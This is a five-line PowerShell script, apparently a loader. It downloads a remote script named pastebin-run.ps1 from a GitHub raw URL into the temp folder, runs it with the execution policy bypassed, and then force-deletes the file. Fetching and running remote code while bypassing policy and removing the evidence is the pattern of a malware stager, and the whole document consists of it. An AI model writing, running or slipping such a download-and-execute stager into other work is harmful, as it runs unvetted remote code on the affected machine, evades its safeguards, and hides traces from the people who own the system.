$url = "https://raw.githubusercontent.com/4V4loon/tools/master/pastebin/pastebin-run.ps1"
$file="$env:tmp\qq.ps1"
Invoke-WebRequest -Uri $url -UseBasicParsing -OutFile $file
powershell -executionpolicy bypass -file $file
remove-item -Path $file -Force
